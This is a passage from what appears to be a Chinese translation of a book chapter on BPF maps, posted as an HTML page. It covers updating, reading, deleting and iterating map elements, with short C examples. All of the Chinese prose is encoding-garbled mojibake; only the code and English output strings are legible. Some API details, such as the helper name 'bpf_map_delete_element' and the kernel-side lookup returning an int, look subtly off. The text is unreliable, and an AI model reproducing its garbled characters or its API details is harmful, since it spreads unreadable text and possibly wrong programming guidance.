¸ä¸­å·¥ä½œæ—¶å¯ä»¥ç›´æ¥è®¿é—®<code>map</code>ï¼Œä½†åœ¨ç”¨æˆ·ç©ºé—´ä¸­å·¥ä½œæ—¶éœ€è¦ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦å¼•ç”¨å®ƒä»¬ã€‚è¡Œä¸ºä¹Ÿç•¥æœ‰ä¸åŒï¼Œå†…æ ¸ä¸Šè¿è¡Œçš„ä»£ç å¯ä»¥ç›´æ¥è®¿é—®å†…å­˜ä¸­çš„<code>map</code>ï¼Œå¹¶ä¸”å¯ä»¥å°±åœ°åŸå­åœ°æ›´æ–°å…ƒç´ ã€‚ä½†æ˜¯ï¼Œåœ¨ç”¨æˆ·ç©ºé—´ä¸­è¿è¡Œçš„ä»£ç å¿…é¡»å°†æ¶ˆæ¯å‘é€åˆ°å†…æ ¸ï¼Œå†…æ ¸ä¼šåœ¨æ›´æ–°<code>map</code>ä¹‹å‰å¤åˆ¶æä¾›çš„å€¼ï¼Œè¿™ä½¿å¾—æ›´æ–°æ“ä½œä¸æ˜¯åŸå­çš„ã€‚æ­¤å‡½æ•°åœ¨æ“ä½œæˆåŠŸæ—¶è¿”å›0ï¼Œåœ¨æ“ä½œå¤±è´¥æ—¶è¿”å›è´Ÿæ•°ã€‚ åœ¨å¤±è´¥çš„æƒ…å†µä¸‹ï¼Œå…¨å±€å˜é‡<code>errno</code>å°†å¡«å……å¤±è´¥åŸå› ã€‚ æˆ‘ä»¬å°†åœ¨æœ¬ç« åé¢åˆ—å‡ºæ›´å¤šä¸Šä¸‹æ–‡çš„å¤±è´¥æ¡ˆä¾‹ã€‚</p><p>å†…æ ¸ä¸­çš„<code>bpf_map_update_elem</code>å‡½æ•°æœ‰å››ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªæ˜¯æŒ‡å‘æˆ‘ä»¬å·²ç»å®šä¹‰çš„<code>map</code>çš„æŒ‡é’ˆã€‚ ç¬¬äºŒä¸ªæ˜¯æŒ‡å‘æˆ‘ä»¬è¦æ›´æ–°çš„é”®çš„æŒ‡é’ˆã€‚ å› ä¸ºå†…æ ¸ä¸çŸ¥é“æˆ‘ä»¬è¦æ›´æ–°çš„é”®çš„ç±»å‹ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•è¢«å®šä¹‰ä¸ºä¸€ä¸ªæŒ‡å‘<code>void</code>çš„ä¸é€æ˜æŒ‡é’ˆï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä¼ é€’ä»»ä½•æ•°æ®ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬è¦æ’å…¥çš„å€¼ã€‚ æ­¤å‚æ•°ä½¿ç”¨ä¸<code>key</code>å‚æ•°ç›¸åŒçš„è¯­ä¹‰ã€‚ åœ¨æœ¬ä¹¦ä¸­ï¼Œæˆ‘ä»¬å±•ç¤ºäº†ä¸€äº›å¦‚ä½•åˆ©ç”¨ä¸é€æ˜æŒ‡é’ˆçš„é«˜çº§ç¤ºä¾‹ã€‚ ä½ å¯ä»¥ä½¿ç”¨æ­¤å‡½æ•°ä¸­çš„ç¬¬å››ä¸ªå‚æ•°æ¥æ›´æ”¹<code>map</code>çš„æ›´æ–°æ–¹å¼ã€‚è¿™ä¸ªå‚æ•°å¯ä»¥å–ä¸‰ä¸ªå€¼ï¼š</p><ul><li>å¦‚æœä½ ä¼ é€’0ï¼Œä½ å‘Šè¯‰å†…æ ¸ä½ æƒ³è¦æ›´æ–°å…ƒç´ å¦‚æœå®ƒå­˜åœ¨æˆ–ä¸å­˜åœ¨å®ƒéƒ½åº”è¯¥åœ¨æ˜ å°„ä¸­åˆ›å»ºå…ƒç´ ã€‚</li><li>å¦‚æœä½ ä¼ é€’1ï¼Œä½ å‘Šè¯‰å†…æ ¸åªåœ¨å…ƒç´ ä¸å­˜åœ¨æ—¶åˆ›å»ºå®ƒã€‚</li><li>å¦‚æœä½ ä¼ é€’2ï¼Œå†…æ ¸åªä¼šåœ¨å…ƒç´ å­˜åœ¨æ—¶æ›´æ–°å®ƒã€‚</li></ul><p>è¿™äº›å€¼è¢«å®šä¹‰ä¸ºä½ å¯ä»¥ä½¿ç”¨çš„å¸¸é‡ï¼Œè€Œä¸å¿…è®°ä½æ•´æ•°è¯­ä¹‰ã€‚å€¼ä¸º<code>BPF_ANY</code>è¡¨ç¤º0ï¼Œ<code>BPF_NOEXIST</code>è¡¨ç¤º1ï¼Œ<code>BPF_EXIST</code>è¡¨ç¤º2ã€‚</p><p>è®©æˆ‘ä»¬ä½¿ç”¨åœ¨ä¸Šä¸€èŠ‚ä¸­å®šä¹‰çš„æ˜ å°„æ¥ç¼–å†™ä¸€äº›ç¤ºä¾‹ã€‚ åœ¨æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å‘<code>map</code>æ·»åŠ äº†ä¸€ä¸ªæ–°å€¼ã€‚ å› ä¸º<code>map</code>æ˜¯ç©ºçš„ï¼Œæˆ‘ä»¬å¯ä»¥å‡è®¾ä»»ä½•æ›´æ–°è¡Œä¸ºéƒ½æ˜¯æ­£å¸¸çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result;</span><br><span class="line">key = <span class="number">1</span>, value = <span class="number">1234</span>;</span><br><span class="line">result = bpf_map_update_elem(&amp;my_map, &amp;key, &amp;value, BPF_ANY); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>strerror</code>æ¥æè¿°<code>errno</code>å˜é‡ä¸­çš„é”™è¯¯é›†ã€‚ ä½ å¯ä»¥ä½¿ç”¨<code>man strerror</code>åœ¨æ‰‹å†Œé¡µä¸Šäº†è§£æœ‰å…³æ­¤åŠŸèƒ½çš„æ›´å¤šä¿¡æ¯ã€‚ç°åœ¨è®©æˆ‘ä»¬çœ‹çœ‹å½“æˆ‘ä»¬å°è¯•åˆ›å»ºå…·æœ‰ç›¸åŒé”®çš„å…ƒç´ æ—¶ä¼šå¾—åˆ°ä»€ä¹ˆç»“æœï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; </span><br><span class="line">key = <span class="number">1</span>, value = <span class="number">5678</span>;</span><br><span class="line">result = bpf_map_update_elem(&amp;my_map, &amp;key, &amp;value, BPF_NOEXIST); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬å·²ç»åœ¨<code>map</code>ä¸­åˆ›å»ºäº†ä¸€ä¸ªé”®ä¸º1çš„å…ƒç´ ï¼Œè°ƒç”¨<code>bpf_map_update_elem</code>çš„ç»“æœå°†ä¸º-1ï¼Œ<code>errno</code>å€¼ä¸º<code>EEXIST</code>ã€‚ è¯¥ç¨‹åºå°†åœ¨å±å¹•ä¸Šæ‰“å°ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to update <span class="built_in">map</span> with <span class="keyword">new</span> value: <span class="number">-1</span> (File exists)</span><br></pre></td></tr></table></figure><p>åŒæ ·ï¼Œè®©æˆ‘ä»¬æ›´æ”¹æ­¤ç¨‹åºä»¥å°è¯•æ›´æ–°ä¸€ä¸ªä¸å­˜åœ¨çš„å…ƒç´ ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; </span><br><span class="line">key = <span class="number">1234</span>, value = <span class="number">5678</span>;</span><br><span class="line">result = bpf_map_update_elem(&amp;my_map, &amp;key, &amp;value, BPF_EXIST); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ ‡å¿—<code>BPF_EXIST</code>ï¼Œæ­¤æ“ä½œçš„ç»“æœå°†å†æ¬¡ä¸º-1ã€‚ å†…æ ¸ä¼šå°†<code>errno</code>å˜é‡è®¾ç½®ä¸º<code>ENOENT</code>ï¼Œç¨‹åºå°†æ‰“å°ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to update <span class="built_in">map</span> with <span class="keyword">new</span> value: <span class="number">-1</span> (No such file <span class="keyword">or</span> directory)</span><br></pre></td></tr></table></figure><p>è¿™äº›ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•ä»å†…æ ¸ç¨‹åºä¸­æ›´æ–°æ˜ å°„ã€‚ ä½ è¿˜å¯ä»¥ä»ç”¨æˆ·ç©ºé—´ç¨‹åºä¸­æ›´æ–°æ˜ å°„ã€‚ æ‰§è¡Œæ­¤æ“ä½œçš„åŠ©æ‰‹ä¸æˆ‘ä»¬åˆšåˆšçœ‹åˆ°çš„ç±»ä¼¼ï¼Œ å”¯ä¸€çš„åŒºåˆ«æ˜¯å®ƒä»¬ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦æ¥è®¿é—®æ˜ å°„ï¼Œè€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨æŒ‡å‘æ˜ å°„çš„æŒ‡é’ˆã€‚æˆ‘ä»¬çŸ¥é“ï¼Œç”¨æˆ·ç©ºé—´ç¨‹åºæ€»æ˜¯ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦è®¿é—®æ˜ å°„ã€‚ å› æ­¤ï¼Œåœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†å‚æ•°<code>my_map</code>æ›¿æ¢ä¸ºå…¨å±€æ–‡ä»¶æè¿°ç¬¦æ ‡è¯†ç¬¦<code>map_data[0].fd</code>ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒåŸå§‹ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; </span><br><span class="line">key = <span class="number">1</span>, value = <span class="number">1234</span>;</span><br><span class="line">result = bpf_map_update_elem(map_data[<span class="number">0</span>].fd, &amp;key, &amp;value, BPF_ANY); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><h4 id="è¯»å–BPFæ˜ å°„ä¸­çš„å…ƒç´ "><a href="#è¯»å–BPFæ˜ å°„ä¸­çš„å…ƒç´ " class="headerlink" title="è¯»å–BPFæ˜ å°„ä¸­çš„å…ƒç´ "></a>è¯»å–BPFæ˜ å°„ä¸­çš„å…ƒç´ </h4><p>BPFè¿˜æä¾›äº†ä¸¤ä¸ªä¸åŒçš„å¸®åŠ©å™¨æ¥æ ¹æ®ä½ çš„ä»£ç è¿è¡Œçš„ä½ç½®ä»æ˜ å°„ä¸­è¯»å–ã€‚ è¿™ä¸¤ä¸ªåŠ©æ‰‹éƒ½ç§°ä¸º <code>bpf_map_lookup_elem</code>ã€‚ å’Œæ›´æ–°åŠ©æ‰‹ä¸€æ ·ï¼Œå®ƒä»¬çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸åŒï¼Œ å†…æ ¸æ–¹æ³•é‡‡ç”¨å¯¹æ˜ å°„çš„å¼•ç”¨ï¼Œè€Œç”¨æˆ·ç©ºé—´åŠ©æ‰‹é‡‡ç”¨æ˜ å°„çš„æ–‡ä»¶æè¿°ç¬¦æ ‡è¯†ç¬¦ä½œä¸ºå…¶ç¬¬ä¸€ä¸ªå‚æ•°ã€‚ä¸¤ç§æ–¹æ³•éƒ½è¿”å›ä¸€ä¸ªæ•´æ•°æ¥è¡¨ç¤ºæ“ä½œæ˜¯å¤±è´¥è¿˜æ˜¯æˆåŠŸï¼Œå°±åƒæ›´æ–°åŠ©æ‰‹ä¸€æ ·ã€‚ è¿™äº›å¸®åŠ©å™¨ä¸­çš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æŒ‡å‘ä»£ç ä¸­å˜é‡çš„æŒ‡é’ˆï¼Œè¯¥å˜é‡å°†å­˜å‚¨ä»æ˜ å°„ä¸­è¯»å–çš„å€¼ã€‚ æˆ‘ä»¬æ ¹æ®ä¸Šä¸€èŠ‚ä¸­çœ‹åˆ°çš„ä»£ç æä¾›ä¸¤ä¸ªç¤ºä¾‹ã€‚</p><p>ç¬¬ä¸€ä¸ªç¤ºä¾‹æ˜¯BPFç¨‹åºåœ¨å†…æ ¸ä¸Šè¿è¡Œæ—¶è¯»å–æ’å…¥åˆ°æ˜ å°„ä¸­çš„å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; <span class="comment">// value is going to store the expected element's value </span></span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_lookup_elem(&amp;my_map, &amp;key, &amp;value); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬è¯•å›¾è¯»å–çš„é”®<code>bpf_map_lookup_elem</code>è¿”å›ä¸€ä¸ªè´Ÿæ•°ï¼Œå®ƒå°†<code>errno</code>å˜é‡ä¸­è®¾ç½®é”™è¯¯ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬åœ¨å°è¯•è¯»å–å¹¶æ²¡æœ‰æ’å…¥çš„å€¼ï¼Œå†…æ ¸å°†è¿”å›â€œæœªæ‰¾åˆ°â€é”™è¯¯<code>ENOENT</code>ã€‚</p><p>ç¬¬äºŒä¸ªç¤ºä¾‹ä¸åˆšåˆšçœ‹åˆ°çš„ç¤ºä¾‹ç±»ä¼¼ï¼Œä½†è¿™æ¬¡æˆ‘ä»¬ä»è¿è¡Œåœ¨ç”¨æˆ·ç©ºé—´çš„ç¨‹åºä¸­è¯»å–æ˜ å°„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; <span class="comment">// value is going to store the expected element's value </span></span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_lookup_elem(map_data[<span class="number">0</span>].fd, &amp;key, &amp;value); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯æˆ‘ä»¬èƒ½å¤Ÿè®¿é—®BPFæ˜ å°„ä¸­çš„ä¿¡æ¯æ‰€éœ€çš„å…¨éƒ¨å†…å®¹ã€‚ æˆ‘ä»¬å°†åœ¨åé¢çš„ç« èŠ‚ä¸­ç ”ç©¶ä¸åŒçš„å·¥å…·åŒ…æ˜¯å¦‚ä½•ç®€åŒ–è¿™ä¸€ç‚¹çš„ï¼Œä»¥ä½¿è®¿é—®æ•°æ®å˜å¾—æ›´åŠ ç®€å•ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬æ¥è°ˆè°ˆä»æ˜ å°„ä¸­åˆ é™¤æ•°æ®ã€‚</p><h4 id="åˆ é™¤BPFæ˜ å°„ä¸­çš„å…ƒç´ "><a href="#åˆ é™¤BPFæ˜ å°„ä¸­çš„å…ƒç´ " class="headerlink" title="åˆ é™¤BPFæ˜ å°„ä¸­çš„å…ƒç´ "></a>åˆ é™¤BPFæ˜ å°„ä¸­çš„å…ƒç´ </h4><p>æˆ‘ä»¬å¯ä»¥åœ¨<code>map</code>ä¸Šæ‰§è¡Œçš„ç¬¬ä¸‰ä¸ªæ“ä½œæ˜¯åˆ é™¤å…ƒç´ ã€‚ ä¸å†™å…¥å’Œè¯»å–å…ƒç´ ä¸€æ ·ï¼ŒBPFä¸ºæˆ‘ä»¬æä¾›äº†ä¸¤ä¸ªä¸åŒçš„å¸®åŠ©å™¨æ¥åˆ é™¤å…ƒç´ ï¼Œéƒ½ç§°ä¸º<code>bpf_map_delete_element</code>ã€‚å’Œå‰é¢çš„ä¾‹å­ä¸€æ ·ï¼Œå½“ä½ åœ¨å†…æ ¸ä¸Šè¿è¡Œçš„ç¨‹åºä¸­ä½¿ç”¨è¿™äº›åŠ©æ‰‹æ—¶ï¼Œå®ƒä»¬ä½¿ç”¨å¯¹æ˜ å°„çš„ç›´æ¥å¼•ç”¨ï¼Œå½“ä½ åœ¨è¿è¡Œç”¨æˆ·ç©ºé—´çš„ç¨‹åºä¸­ä½¿ç”¨å®ƒä»¬æ—¶ï¼Œå®ƒä»¬ä½¿ç”¨æ˜ å°„çš„æ–‡ä»¶æè¿°ç¬¦æ ‡è¯†ã€‚</p><p>ç¬¬ä¸€ä¸ªç¤ºä¾‹æ˜¯BPFç¨‹åºåœ¨å†…æ ¸ä¸Šè¿è¡Œæ—¶åˆ é™¤äº†æ’å…¥åˆ°æ˜ å°„ä¸­çš„å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, result; </span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_delete_element(&amp;my_map, &amp;key); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Element deleted from the map\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to delete element from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ å°è¯•åˆ é™¤çš„å…ƒç´ ä¸å­˜åœ¨ï¼Œå†…æ ¸å°†è¿”å›ä¸€ä¸ªè´Ÿæ•°ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒè¿˜ä¼šä½¿ç”¨â€œæœªæ‰¾åˆ°â€é”™è¯¯<code>ENOENT</code>å¡«å……<code>errno</code>å˜é‡ã€‚</p><p>ç¬¬äºŒä¸ªç¤ºä¾‹æ˜¯å½“BPFç¨‹åºè¿è¡Œåœ¨ç”¨æˆ·ç©ºé—´æ—¶åˆ é™¤å…ƒç´ `</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, result; </span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_delete_element(map_data[<span class="number">0</span>].fd, &amp;key); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Element deleted from the map\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to delete element from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><h4 id="è¿­ä»£BPFæ˜ å°„ä¸­çš„å…ƒç´ "><a href="#è¿­ä»£BPFæ˜ å°„ä¸­çš„å…ƒç´ " class="headerlink" title="è¿­ä»£BPFæ˜ å°„ä¸­çš„å…ƒç´ "></a>è¿­ä»£BPFæ˜ å°„ä¸­çš„å…ƒç´ </h4><p>æˆ‘ä»¬åœ¨æœ¬èŠ‚ä¸­çœ‹åˆ°çš„æœ€åä¸€ä¸ªæ“ä½œå¯ä»¥å¸®åŠ©ä½ åœ¨BPFç¨‹åºä¸­æ‰¾åˆ°ä»»æ„å…ƒç´ ã€‚ æœ‰æ—¶ä½ ä¸çŸ¥é“è¦æŸ¥æ‰¾çš„å…ƒç´ çš„ç¡®åˆ‡é”®ï¼Œæˆ–è€…åªæƒ³æŸ¥çœ‹<code>map</code>ä¸­çš„å†…å®¹ã€‚BPFä¸ºæ­¤æä¾›äº†ä¸€ä¸ªåä¸º<code>bpf_map_get_next_key</code>çš„æŒ‡ä»¤ã€‚ æ­¤æŒ‡ä»¤ä»…é€‚ç”¨äºåœ¨ç”¨æˆ·ç©ºé—´è¿è¡Œçš„ç¨‹åºã€‚</p><p>è¿™ä¸ªå¸®åŠ©å™¨ä¸ºä½ æä¾›äº†ä¸€ç§ç¡®å®šçš„æ–¹å¼æ¥è¿­ä»£<code>map</code>ä¸Šçš„å…ƒç´ ï¼Œä½†å®ƒä¸å¦‚å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ä¸­çš„è¿­ä»£å™¨é‚£ä¹ˆç›´è§‚ã€‚ å®ƒéœ€è¦ä¸‰ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªæ˜¯<code>map</code>çš„æ–‡ä»¶æè¿°ç¬¦æ ‡è¯†ç¬¦ï¼Œç¬¬äºŒä¸ªå‚æ•°<code>key</code>æ˜¯è¦æŸ¥æ‰¾çš„æ ‡è¯†ç¬¦ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°<code>next_key</code>æ˜¯æ˜ å°„ä¸­çš„ä¸‹ä¸€ä¸ªé”®ã€‚æˆ‘ä»¬æ›´å–œæ¬¢å°†ç¬¬ä¸€ä¸ªå‚æ•°ç§°ä¸º<code>lookup_key</code>ã€‚ å½“ä½ è°ƒç”¨è¿™ä¸ªå¸®åŠ©å™¨æ—¶ï¼ŒBPFä¼šå°è¯•åœ¨è¿™ä¸ª<code>map</code>ä¸­ä½¿ç”¨ä½œä¸ºæŸ¥æ‰¾é”®ä¼ é€’çš„é”®æ¥æŸ¥æ‰¾å…ƒç´ ï¼Œ ç„¶åï¼Œå®ƒå°†<code>next_key</code>å‚æ•°è®¾ç½®ä¸ºæ˜ å°„ä¸­çš„ç›¸é‚»é”®ã€‚ æ‰€ä»¥å¦‚æœä½ æƒ³çŸ¥é“<code>key 1</code>ä¹‹åæ˜¯å“ªä¸ª<code>key</code>ï¼Œä½ éœ€è¦è®¾ç½®1ä½œä¸ºä½ çš„æŸ¥æ‰¾<code>key</code>ï¼Œå¦‚æœ<code>map</code>æœ‰ä¸€ä¸ªä¸è¿™ä¸ª<code>key</code>ç›¸é‚»çš„<code>key</code>ï¼ŒBPFä¼šå°†å®ƒè®¾ç½®ä¸º<code>next_key</code>å‚æ•°çš„å€¼ã€‚</p><p>åœ¨æŸ¥çœ‹<code>bpf_map_get_next_key</code>çš„å·¥ä½œåŸç†ä¹‹å‰ï¼Œè®©æˆ‘ä»¬åœ¨<code>map</code>ä¸­å¤šæ·»åŠ ä¸€äº›å…ƒç´ ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> new_key, new_value, it; </span><br><span class="line"><span class="keyword">for</span>(it=<span class="number">2</span>;it&lt;<span class="number">6</span>;it++)&#123;</span><br><span class="line">  new_key = it;</span><br><span class="line">     new_value = <span class="number">1234</span> + it;</span><br><span class="line">     bpf_map_update_elem(map_data[<span class="number">0</span>].fd, &amp;new_key, &amp;new_value, BPF_NOEXIST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœè¦æ‰“å°æ˜ å°„ä¸­çš„æ‰€æœ‰å€¼ï¼Œå¯ä»¥å°†<code>bpf_map_get_next_key</code>ä¸æ˜ å°„ä¸­ä¸å­˜åœ¨çš„æŸ¥æ‰¾é”®ä¸€èµ·ä½¿ç”¨ã€‚ è¿™ä¼šå¼ºåˆ¶BPFä»<code>map</code>çš„å¼€å¤´å¼€å§‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> next_key, lookup_key; </span><br><span class="line">lookup_key = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(bpf_map_get_next_key(map_data[<span class="number">0</span>].fd, &amp;lookup_key, &amp;next_key) == <span class="number">0</span>) &#123; </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The next key in the map is: '%d'\n"</span>, next_key);</span><br><span class="line">lookup_key = next_key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The next key in the map is: '1'</span><br><span class="line">The next key in the map is: '2'</span><br><span class="line">The next key in the map is: '3'</span><br><span class="line">The next key in the map is: '4'</span><br><span class="line">The next key in the map is: '5'</span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥çœ‹åˆ°åœ¨å¾ªç¯ç»“æŸæ—¶å°†ä¸‹ä¸€ä¸ªé”®åˆ†é…ç»™<code>lookup_key</code>ï¼Œ è¿™æ ·ï¼Œæˆ‘ä»¬ç»§ç»­éå†<code>map</code>ï¼Œç›´åˆ°ç»ˆç‚¹ã€‚ å½“<code>bpf_map_get_next_key</code>åˆ°è¾¾<code>map</code>æœ«å°¾æ—¶ï¼Œè¿”å›å€¼ä¸ºè´Ÿæ•°ï¼Œ<code>errno</code>å˜é‡è®¾ç½®ä¸º<code>ENOENT</code>ã€‚ è¿™å°†ä¸­æ­¢å¾ªç¯æ‰§è¡Œã€‚</p><p><code>bpf_map_get_next_key</code>å¯ä»¥æŸ¥æ‰¾ä»<code>map</code>ä¸­ä»»æ„ç‚¹å¼€å§‹çš„é”®ï¼Œå¦‚æœä½ åªæƒ³è¦å¦ä¸€ä¸ªç‰¹å®šé”®çš„ä¸‹ä¸€ä¸ªé”®ï¼Œåˆ™ä¸éœ€è¦ä»<code>map</code>çš„å¼€å¤´å¼€å§‹ã€‚</p><p>è®¸å¤šç¼–ç¨‹è¯­è¨€åœ¨éå†å…¶å…ƒç´ ä¹‹å‰ä¼šå¤åˆ¶æ˜ å°„ä¸­çš„å€¼ã€‚ å¦‚æœä½ çš„ç¨‹åºä¸­çš„æŸäº›å…¶ä»–ä»£ç è¯•å›¾æ”¹å˜<code>map</code>ï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢ä¸€äº›æœªçŸ¥è¡Œä¸ºã€‚å¦‚æœè¯¥ä»£ç ä»<code>map</code>ä¸­åˆ é™¤å…ƒç´ ï¼Œè¿™å°†ä¼šæ˜¯ä¸€ä¸ªå±é™©çš„æ“ä½œã€‚BPFåœ¨ä½¿ç”¨<code>bpf_map_get_next_key</code>å¾ªç¯ä¹‹å‰ä¸ä¼šå¤åˆ¶æ˜ 